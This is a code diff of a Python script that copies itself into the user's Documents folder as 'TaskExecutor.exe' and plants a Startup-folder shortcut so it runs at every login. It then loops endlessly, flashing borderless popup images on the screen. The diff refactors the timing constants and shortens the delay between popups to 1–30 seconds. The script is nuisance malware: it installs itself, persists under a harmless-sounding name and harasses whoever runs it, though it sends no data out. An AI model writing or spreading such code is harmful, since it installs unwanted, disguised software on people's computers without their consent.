@@ -8,7 +8,7 @@ images = [
 """...""",""""..."""
 ]
 
-def show_and_disappear(img_str, duration=200):
+def show_and_disappear(img_str, duration):
     root = tk.Tk()
     root.overrideredirect(True)
 
@@ -44,33 +44,30 @@ def copy_self(path):
     except Exception as e:
         sys.exit()
 
-def add_to_startup(exe_path):
+def add_to_startup(path):
     startup_folder = os.path.join(os.environ['APPDATA'], 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
     shortcut_path = os.path.join(startup_folder, 'TaskExecutor.lnk')
     with winshell.shortcut(shortcut_path) as shortcut:
-        shortcut.path = exe_path
+        shortcut.path = path
         shortcut.description = "TaskExecutor"
 
 
 if __name__ == "__main__":
-
-    # Path where exe will be copied in system
-    exe_dest_path = os.path.join(os.environ['USERPROFILE'], 'Documents','TaskExecutor.exe')
+    POPUP_DURATION = 200
+    MIN_TIME = 1 
+    MAX_TIME = 30
+    EXE_DEST_PATH = os.path.join(os.environ['USERPROFILE'], 'Documents','TaskExecutor.exe')
     
-    if not os.path.exists(exe_dest_path):
-        copy_self(exe_dest_path)
-        add_to_startup(exe_dest_path)
+    if not os.path.exists(EXE_DEST_PATH):
+        copy_self(EXE_DEST_PATH)
+        add_to_startup(EXE_DEST_PATH)
 
-        subprocess.Popen([exe_dest_path], shell=True)
+        subprocess.Popen([EXE_DEST_PATH], shell=True)
         sys.exit()
 
     else:
         while True:
             # Time range in which the image will be shown
-            time.sleep(random.randint(60,1800))
-
-            show_and_disappear(images[random.randint(0, len(images)-1)])
+            time.sleep(random.randint(MIN_TIME, MAX_TIME))
+            show_and_disappear(images[random.randint(0, len(images)-1)], POPUP_DURATION)
         
-            # Alternative with custom duration
-            # Duration is in milliseconds
-            # show_and_disappear(images[random.randint(0, len(images)-1)], duration=1000)
